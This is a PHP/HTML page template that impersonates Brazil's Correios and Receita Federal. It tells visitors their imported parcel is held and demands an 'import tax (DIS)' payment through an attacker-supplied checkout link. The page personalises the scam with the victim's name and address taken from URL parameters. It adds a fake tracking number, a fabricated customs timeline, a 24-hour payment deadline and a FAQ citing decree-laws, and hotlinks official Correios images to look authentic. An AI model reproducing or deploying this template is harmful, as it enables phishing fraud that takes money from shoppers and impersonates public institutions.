<?php
// Adiciona 24 horas à data atual
$dataFutura = date('d/m/Y', strtotime('+24 hours'));
?>


<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Taxa de importação (DIS) - Receita Federal</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="style2.css">
<style>

@import url('https://fonts.googleapis.com/css?family=Hind:300,400&display=swap');

*, *::before, *::after {
  box-sizing: border-box;
}

 /* Barra principal de navegação */
    nav {
      display: flex;
      align-items: center;
      background-color: #f7f7f7;
      width: 100%;
      padding: 8px 0;
      border-bottom: 2px solid #ffc107;
    }

    .menu-toggle {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      width: 50px;
    }

    .bar {
      width: 20px;
      height: 3px;
      background-color: #277AB8; /* Cor das barras */
      margin: 3px 0;
    }

    .logo {
      display: flex;
      justify-content: center;
      width: 100%;
    }

    .logo img {
      height: 25px;
    }

    .login {
      display: none;
      width: 150px;
      text-align: right;
    }

    .login a {
      display: flex;
      align-items: center;
      text-decoration: none;
      color: #005a9c;
      border-left: 1px solid #ccc;
      padding-left: 16px;
    }

    .login img {
      width: 31px;
      margin-right: 8px;
    }

    /* Estilos responsivos */
    @media (min-width: 992px) {
      .login {
        display: block;
      }

      .menu-toggle {
        display: none;
      }

        button:hover {
            background-color: #005f8c;
        }
    }



.containe-faq {
  margin: 0 auto;
  width: 100%;
}

.timeline-faq {
  max-width: 56rem;
  margin: 0 auto;
}

.timeline-faq h2 {
  font-weight: 700;
  font-size: 1.5rem;
  margin: 0 0 12px;
  color: #333;
}

.accordion .accordion-item {
  border: 1px solid #e5e5e5;
  border-radius: 10px;
  padding: 4px 16px;
  margin: 10px 0;
  background: #ffffff;
}

.accordion button {
  position: relative;
  display: block;
  text-align: left;
  width: 100%;
  padding: 0.5em 0;
  color: #000;
  font-size: 0.95rem;
  font-weight: 400;
  border: none;
  background: none;
  outline: none;
}

.accordion button::after {
  content: "+";
  position: absolute;
  right: 0;
  top: 50%;
  transform: translateY(-50%);
  font-weight: 700;
  transition: transform .2s;
}

.accordion button:hover,
.accordion button:focus {
  cursor: pointer;
  color: #277AB8;
}

.accordion .accordion-title {
  padding: 1em 1.5em 1em 0;
}

.accordion .icon { display: none; }

.accordion .icon::before {
  display: block;
  position: absolute;
  content: '';
  top: 9px;
  left: 5px;
  width: 10px;
  height: 2px;
  background: currentColor;
}

.accordion .icon::after {
  display: block;
  position: absolute;
  content: '';
  top: 5px;
  left: 9px;
  width: 2px;
  height: 10px;
  background: currentColor;
}

.accordion button[aria-expanded='true'] {
  color: #277AB8;
  border-bottom: 1px solid #277AB8;
}

.accordion button[aria-expanded='true']::after {
  content: "–";
  transform: translateY(-50%) scale(1.1);
}

.accordion button + .accordion-content {
  display: none;
  opacity: 0;
  max-height: 0;
  overflow: hidden;
  transition: opacity 200ms linear, max-height 200ms linear;
  will-change: opacity, max-height;
  color: #333;
  line-height: 1.55;
}

.accordion button[aria-expanded='true'] + .accordion-content {
  display: block;
  opacity: 1;
  max-height: 1000px;
  transition: all 200ms linear;
  will-change: opacity, max-height;
}

.accordion .accordion-content p {
  font-size: 14px !important;
  font-weight: 300;
  margin: 10px 0 0;
  color: #333 !important;
}
    </style>

</head>



<body>
        <header>
    <!-- Barra de acessibilidade -->

    <!-- Barra principal de navegação -->
    <nav>
      <!-- Botão de menu -->
      <div class="menu-toggle" id="menu-toggle">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
      </div>

      <!-- Logo -->
      <div class="logo">
        <a href="#">
          <img src="topo.png" alt="Logo Correios">
        </a>
      </div>

      
    </nav>
  </header>
    <!-- Seção de verificação do pedido -->
    <div id="verification-section" class="full-screen-section">
        <div class="verification-content">
<h1>Olá, <?php echo htmlspecialchars(isset($_GET['nome']) ? $_GET['nome'] : 'em processamento...'); ?></h1>
            <p>Aguarde enquanto verificamos suas encomendas...</p>
            <!-- Barra de progresso animada -->
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
    </div>

    <!-- Seção após a verificação -->
    <div id="error-section" class="full-screen-section hidden">
        <!-- Box separadas que aparecem uma abaixo da outra -->
        <div class="box-stage hidden" id="box-1">
            <h3>📦 ENCOMENDAS LOCALIZADAS</h3>
			<hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">
            <h4 style="text-align: left;"><span style="font-size: 18px; font-weight: 700; color: #ff0000;">RETIDA </span></h4>	
				<div class="produto">
					<div class="produto-info">
						<h4><?php echo htmlspecialchars(isset($_GET['produtos']) ? $_GET['produtos'] : 'Taxa de Importação (DIS)'); ?></h4>
						<p>1 Unidade.</p>
					</div>
                    <span style="font-size: 18px; font-weight: 700;">R$<?php echo htmlspecialchars(isset($_GET['produto_preco']) ? number_format($_GET['produto_preco'], 2, ',', '') : '46,89'); ?></span>
</div>
     
                <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;">
                <div class="produto-info">
                <h4><strong>Endereço:</strong> <?php echo htmlspecialchars(isset($_GET['cidade']) ? $_GET['cidade'] : ''); ?> - <?php echo htmlspecialchars(isset($_GET['estado']) ? $_GET['estado'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['cep']) ? $_GET['cep'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['bairro']) ? $_GET['bairro'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['rua']) ? $_GET['rua'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['numero']) ? $_GET['numero'] : ''); ?>.
                 </h4>
            </div>
			</div>		


        <div class="box-stage hidden" id="box-2">
            <h3>❌ VERIFICANDO PENDÊNCIAS</h3>
            <p>Estamos localizando os débitos da sua encomenda, aguarde...</p>
            <div class="progress-bar">
                <div class="progress2" id="progress2"></div>
            </div>
        </div>
        <div class="box-stage hidden" id="box-3">
            <h3>⚠️ DÉBITOS LOCALIZADOS</h3>
            <p>Sua encomenda está retida! Realize o pagamento da Taxa de Importação (DIS) para receber o objeto no seu endereço.</p>
        </div>
          

        <div class="box-stage-taxa hidden" id="box-rastreio">


            <div class="card">
                <div class="status"><span class="blinking-dot"></span>AGUARDANDO PAGAMENTO</div>
                <div class="rastreamento">Rastreamento: <strong>NL 589 586 516 BR</strong></div>
                <div class="tarifa">Tarifa pendente: <strong>R$<?php echo htmlspecialchars(isset($_GET['taxa_preco']) ? number_format($_GET['taxa_preco'], 2, ',', '') : '48,86'); ?></strong></div>
                <a href="<?php echo htmlspecialchars(isset($_GET['link_checkout']) ? $_GET['link_checkout'] : ''); ?>" id="retry-button" class="retry-button">PAGAR TAXA</a>
                <div class="prazo">Prazo máximo para pagamento:<br><strong><?php echo $dataFutura; ?></strong></div>
            </div>
			<br>	
                <div class="timeline">
					<div class="timeline-item">
						<div class="timeline-icon-container">
							<img src="https://rastreamento.correios.com.br/static/rastreamento-internet/imgs/novos/caixa-visto-stroke.svg" alt="Ícone de entrega" class="timeline-icon">
						</div>
						<div class="timeline-content">
							<div class="timeline-title">Objeto a caminho do destinatário</div>
							<div class="timeline-date">AGUARDANDO PAGAMENTO</div>
							<div class="timeline-description"> <?php echo htmlspecialchars(isset($_GET['cidade']) ? $_GET['cidade'] : ''); ?> - <?php echo htmlspecialchars(isset($_GET['estado']) ? $_GET['estado'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['cep']) ? $_GET['cep'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['bairro']) ? $_GET['bairro'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['rua']) ? $_GET['rua'] : ''); ?>, <?php echo htmlspecialchars(isset($_GET['numero']) ? $_GET['numero'] : ''); ?></div>
						</div>
					</div>
					<div class="timeline-item">
						<div class="timeline-icon-container">
							<img src="https://rastreamento.correios.com.br/static/rastreamento-internet/imgs/novos/documento-verificar-stroke.svg" alt="Ícone de encaminhamento" class="timeline-icon">
						</div>
						<div class="timeline-content">
							<div class="timeline-title">Fiscalização aduaneira concluida - Importação aprovada</div>
							<div class="timeline-date"><?php 
        if (isset($_GET['data_compra']) && $_GET['data_compra'] !== '') {
            $data_compra = date('Y-m-d', strtotime($_GET['data_compra'] . ' +4 day'));
            echo htmlspecialchars($data_compra);
        } else {
            echo '';
        }  ?> 12:30</div>
							<div class="timeline-description">Encomenda internacional fiscalizada, aguardando o pagamento da Taxa de importação (DIS).</div>
						</div>
					</div>
					<div class="timeline-item">
						<div class="timeline-icon-container">
							<img src="https://rastreamento.correios.com.br/static/rastreamento-internet/imgs/novos/documento-verificar-stroke.svg" alt="Ícone de fiscalização" class="timeline-icon">
						</div>
						<div class="timeline-content">
							<div class="timeline-title">Objeto em fiscalização aduaneira</div>
							<div class="timeline-date"><?php 
        if (isset($_GET['data_compra']) && $_GET['data_compra'] !== '') {
            $data_compra = date('Y-m-d', strtotime($_GET['data_compra'] . ' +4 day'));
            echo htmlspecialchars($data_compra);
        } else {
            echo '';
        }  ?> 9:29</div>
							<div class="timeline-description">Objeto em fiscalização de importação na Receita Federal</div>
						</div>
					</div>
					<div class="timeline-item">
						<div class="timeline-icon-container">
							<img src="https://rastreamento.correios.com.br/static/rastreamento-internet/imgs/novos/bandeira-brasil-stroke.svg" alt="Ícone de recebimento" class="timeline-icon">
						</div>
						<div class="timeline-content">
							<div class="timeline-title">Objeto recebido pelos Correios do Brasil.</div>
							<div class="timeline-date"><?php 
        if (isset($_GET['data_compra']) && $_GET['data_compra'] !== '') {
            $data_compra = date('Y-m-d', strtotime($_GET['data_compra'] . ' +3 day'));
            echo htmlspecialchars($data_compra);
        } else {
            echo '';
        }  ?> 15:41</div>
							<div class="timeline-description">CURITIBA - PR</div>
						</div>
					</div>
					<div class="timeline-item">
						<div class="timeline-icon-container">
							<img src="https://rastreamento.correios.com.br/static/rastreamento-internet/imgs/novos/postagem-stroke.svg" alt="Ícone de postagem" class="timeline-icon">
						</div>
						<div class="timeline-content">
							<div class="timeline-title">Objeto postado</div>
							<div class="timeline-date">    <?php 
        if (isset($_GET['data_compra']) && $_GET['data_compra'] !== '') {
            $data_compra = date('Y-m-d', strtotime($_GET['data_compra'] . ' +1 day'));
            echo htmlspecialchars($data_compra);
        } else {
            echo '';
        }
    ?> 17:18</div>
							<div class="timeline-description">CHINA</div>
						</div>
					</div>
				</div>
            <br>
				<div class="timeline-faq">
					<h2>❓ Dúvidas frequentes</h2>
					<div class="accordion">
					  <div class="accordion-item">
						<button id="accordion-button-1" aria-expanded="false"><span class="accordion-title">O que é a taxa de importação (DIS)?</span><span class="icon" aria-hidden="true"></span></button>
						<div class="accordion-content">
						  <p style="margin: 5px 0; color: #777; font-size: 17px; text-align: left;">O imposto internacional alfandegário, também conhecido como Taxa de Importação (DIS) é o valor cobrado pelo Governo Federal visando regulamentar mercadorias internacionais que entram no Brasil.
                       <br>   <span style="font-style: italic; font-weight: bold; font-size: 14px;"> DECRETO-LEI Nº 2.472, DE 1º DE SETEMBRO DE 1988.</span></p>
						</div>
					  </div>
					  <div class="accordion-item">
						<button id="accordion-button-2" aria-expanded="false"><span class="accordion-title">Em quanto tempo minha encomenda chega?</span><span class="icon" aria-hidden="true"></span></button>
						<div class="accordion-content">
                        <p style="margin: 5px 0; color: #777; font-size: 17px; text-align: left;">Após realizar o pagamento da taxa de importação, sua encomenda é despachada em até <span style="font-weight: bold;">1 dia útil</span>. Após o despacho, ela chegará na sua residência em até <span style="font-weight: bold;">5 dias úteis</span>.</p>
						</div>
					  </div>
					  <div class="accordion-item">
						<button id="accordion-button-3" aria-expanded="false"><span class="accordion-title">Preciso enviar o comprovante de pagamento?</span><span class="icon" aria-hidden="true"></span></button>
						<div class="accordion-content">
                        <p style="margin: 5px 0; color: #777; font-size: 17px; text-align: left;">Não, a taxa tem efetivação instantânea no sistema dos Correios. <span style="font-weight: bold;">Preencha seus dados corretamente</span> para que a liberação do produto seja feita automáticamente.</p>
						</div>
					  </div>
					  <div class="accordion-item">
						<button id="accordion-button-4" aria-expanded="false"><span class="accordion-title">Como rastreio minha encomenda?</span><span class="icon" aria-hidden="true"></span></button>
						<div class="accordion-content">
                        <p style="margin: 5px 0; color: #777; font-size: 17px; text-align: left;">No momento que a encomenda for despachada<span style="font-weight: bold;"> (1 dia útil após o pagamento)</span>, você receberá um novo código de rastreio para <span style="font-weight: bold;">rastreá-la</span> no Brasil. O novo código será enviado por SMS e e-mail, <span style="font-weight: bold;">preencha seus dados corretamente ao pagar a taxa para receber.</span>.</p>
						</div>
					  </div>
					  <div class="accordion-item">
						<button id="accordion-button-5" aria-expanded="false"><span class="accordion-title">O que acontece caso haja inadimplência da taxa?</span><span class="icon" aria-hidden="true"></span></button>
						<div class="accordion-content">
                        <p style="margin: 5px 0; color: #777; font-size: 17px; text-align: left;">Caso o pagamento da taxa de importação (DIS) não seja realizado, a <span style="font-weight: bold;">encomenda retornará para o remetente</span> e caso o remetente recuse a devolução, o objeto estará sujeito a ser leiloado.
<br><span style="font-style: italic; font-weight: bold; font-size: 14px;"> DECRETO-LEI Nº 1.455, DE 7 DE ABRIL DE 1976.</span></p>
						</div>
					  </div>
					</div>
				  </div>

                    </div>

        </div>
    </div>
   

    <script src="script.js"></script>
</body>
<footer id="rodape">
    <div class="recipiente largura-maxima">
        <div class="rodape-links">
            <h2>Fale Conosco</h2>
            <ul class="lista-icone">
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/monitor.png">
                        <span>Registro de Manifestações</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/duvida.png">
                        <span>Central de Atendimento</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/negocios.png">
                        <span>Soluções para o seu negócio</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/headset.png">
                        <span>Suporte ao cliente com contrato</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/ouvidoria.png">
                        <span>Ouvidoria</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="rodape-links">
            <h2>Sobre os Correios</h2>
            <ul class="lista-icone">
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/identidade.png">
                        <span>Identidade corporativa</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/educação.png">
                        <span>Educação e cultura</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/código ética.png">
                        <span>Código de ética</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/Transparência.png">
                        <span>Transparência e prestação de contas</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/cadeado.png">
                        <span>Política de Privacidade e Notas Legais</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <div class="copyright">&copy; Copyright 2024 Correios</div>
</footer>
<script>
const items = document.querySelectorAll(".accordion button");

function toggleAccordion() {
  const itemToggle = this.getAttribute('aria-expanded');
  
  for (i = 0; i < items.length; i++) {
    items[i].setAttribute('aria-expanded', 'false');
  }
  
  if (itemToggle == 'false') {
    this.setAttribute('aria-expanded', 'true');
  }
}

items.forEach(item => item.addEventListener('click', toggleAccordion));

</script>
</html>